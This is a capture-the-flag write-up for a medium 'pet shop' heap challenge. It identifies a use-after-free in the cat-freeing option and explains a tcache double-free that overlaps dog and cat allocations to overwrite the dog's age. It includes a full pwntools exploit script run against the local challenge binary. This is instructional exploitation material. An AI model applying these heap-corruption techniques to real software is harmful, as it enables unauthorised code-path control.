---
title: "CatchTheFlag"
difficulty: Medium
description: "I can't get my dog to catch the flag. Can you?"
flag: "(obtained remotely)"
---

# Catch the flag

> *I can't get my dog to catch the flag. Can you?*

32-bit PIE ELF, dynamically linked. pet shop menu:

```
1) Buy a dog
2) Play catch the flag with your dog
3) Buy a cat
4) Post pictures of your cat online
5) Let them eat your dog
6) Watch them eat your cat
0) Quit
```

from the ghidra decompile, `catchFlag` checks if `dog->age >= 5` and calls `win()` which reads flag.txt:

```c
void catchFlag(int param_1)
{
  printf("You play catch the flag with your dog.");
  fflush(_stdout);
  sleep(1);
  putchar(0x2e);
  fflush(_stdout);
  sleep(1);
  putchar(0x2e);
  fflush(_stdout);
  sleep(1);
  if (*(int *)(param_1 + 0x10) < 5) {
    printf("\n%s is too young and is not able to catch the flag yet...\n",param_1);
  }
  else {
    puts("\nHe managed to catch the flag!!!");
    win();
  }
  return;
}
```

but `newDog` always sets the age to 0:

```c
char * newDog(void)
{
  char *__s;
  puts("Give it a name : ");
  __s = malloc(0x14);
  fgets(__s,0x10,_stdin);
  removeNl(__s);
  __s[0x10] = '\0';
  __s[0x11] = '\0';
  __s[0x12] = '\0';
  __s[0x13] = '\0';
  return __s;
}
```

no way to increase age through normal gameplay. so we need memory corruption.

the bug is in option 6, "eat cat":

```c
case '6':
  if (local_14 == (void *)0x0) {
    puts("You are catless...");
  }
  else {
    free(local_14);
    puts("They are eating the cat.");
  }
  break;
```

It frees `local_14` but never sets it to NULL. compare with option 5 "eat dog" which does `local_18 = (void *)0x0` after freeing. So after eating the cat, `local_14` still points to the freed chunk. Uaf!

looking at the struct sizes: `newDog` does `malloc(0x14)` (20 bytes), `newCat` does `malloc(0x18)` (24 bytes). both get rounded up to 0x20 chunks by the allocator. same tcache bin. 

```c
undefined4 * newCat(void)
{
  undefined4 *puVar1;
  puts("Give it a name : ");
  puVar1 = malloc(0x18);
  fgets((char *)(puVar1 + 2),0x10,_stdin);
  removeNl(puVar1 + 2);
  puVar1[1] = 0;
  *puVar1 = 0;
  return puVar1;
}
```

cat layout: `count` at +0x00, `followers` at +0x04, `name[16]` at +0x08. dog layout: `name[16]` at +0x00, `age` at +0x10.

so if we get a cat and a dog allocated at the same address A:
- cat's `name` starts at A+0x08
- `name[8]` through `name[11]` map to A+0x10 through A+0x13
- that's exactly `dog->age`

the plan: [tcache double-free](https://github.com/shellphish/how2heap) to get two allocations at the same address. buy cat, free it (UAF), corrupt the tcache key via `postPictures` (increments count at [A+0] which corrupts the tcache metadata), free the cat again (double-free works because tcache key is corrupted). now tcache has a circular entry: A -> A.

buy a dog (pops A from tcache, dog lives at A). buy a cat with a crafted name (pops A again, cat also lives at A). the cat name starts at A+0x08, so bytes 8-11 of the name land at A+0x10 = `dog->age`.

```python
from pwn import *

BINARY = './catchtheflag'
context.binary = BINARY

def wait_menu(p):
    p.recvuntil(b'0) Quit\n', timeout=30)

def buy_dog(p, name):
    p.sendline(b'1')
    p.recvuntil(b'Give it a name : \n', timeout=30)
    p.sendline(name)
    wait_menu(p)

def buy_cat(p, name):
    p.sendline(b'3')
    p.recvuntil(b'Give it a name : \n', timeout=30)
    p.sendline(name)
    wait_menu(p)

def post_pictures(p):
    p.sendline(b'4')
    p.recvuntil(b'0) Quit\n', timeout=30)

def eat_cat(p):
    p.sendline(b'6')
    wait_menu(p)

def play_catch(p):
    p.sendline(b'2')

p = process(BINARY)
wait_menu(p)

buy_cat(p, b'FIRSTCAT')
eat_cat(p)
post_pictures(p)
eat_cat(p)

buy_dog(p, b'GOODBOY')
payload = b"P" * 8 + b"A" * 4 + b"PP"
buy_cat(p, payload)

play_catch(p)
output = p.recvall(timeout=30)
print(output.decode(errors='replace'))
```

the payload `b"P" * 8 + b"A" * 4 + b"PP"` puts padding at name[0..7], then `AAAA` at name[8..11] which overwrites `dog->age` with `0x41414141`. `newCat` then zeros A+0x00 and A+0x04 (count and followers) but doesn't touch A+0x10, so the age survives.

`dog->age = 0x41414141 = 1094795585`, which is definitely `>= 5`. play catch fires `win()`.

tcache safe linking (glibc 2.32+) mangles the next pointer with `ptr ^ (addr >> 12)`, but it doesn't matter here. the circular tcache entry A -> A works regardless of mangling since both pops return the same address.

`CSC{iforgot}` (obtained remotely)
